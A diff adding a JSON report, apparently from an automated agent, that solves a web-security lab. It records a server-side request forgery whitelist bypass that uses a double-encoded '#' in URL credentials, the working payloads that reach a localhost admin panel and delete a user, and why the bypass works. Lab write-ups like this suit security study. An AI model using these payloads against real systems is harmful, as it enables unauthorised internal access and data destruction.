@@ -1,0 +1,22 @@
+{
+    "status": "SUCCESS",
+    "solved": true,
+    "steps": [
+        "Explored the target application homepage and discovered product pages with stock check feature",
+        "Identified the POST /product/stock endpoint with stockApi parameter pointing to http://stock.weliketoshop.net:8080/product/stock/check",
+        "Confirmed whitelist filter: direct http://127.0.0.1/ returns 'External stock check host must be stock.weliketoshop.net'",
+        "Tested embedded credentials: http://username@stock.weliketoshop.net/ accepted (500 error trying to connect to 'username')",
+        "Tested # fragment: http://username#@stock.weliketoshop.net/ rejected by whitelist",
+        "Tested double-URL-encoded #: http://username%2523@stock.weliketoshop.net/ gives 500 (server tried to connect)",
+        "Used raw content body to avoid httpx re-encoding: stockApi=http://localhost%2523@stock.weliketoshop.net/admin returned 200 with admin panel HTML",
+        "Found delete link: /admin/delete?username=carlos on the admin page",
+        "Sent SSRF payload: stockApi=http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos",
+        "Lab solved - carlos deleted successfully"
+    ],
+    "evidence": [
+        "Admin page accessed via SSRF returned HTTP 200 with user list showing wiener and carlos with delete links",
+        "Delete request returned HTTP 401 but the lab banner changed to 'is-solved' class",
+        "Homepage check confirmed 'solved' text present in response"
+    ],
+    "comments": "The SSRF whitelist bypass works by using double-URL-encoded # (%2523) in the URL credentials section. The URL parser sees stock.weliketoshop.net as the hostname (passing the whitelist), but the server double-decodes the URL: %25->% then %23-># making localhost the actual target host. The key was sending the payload as raw form body content to prevent httpx from re-encoding the %2523."
+}
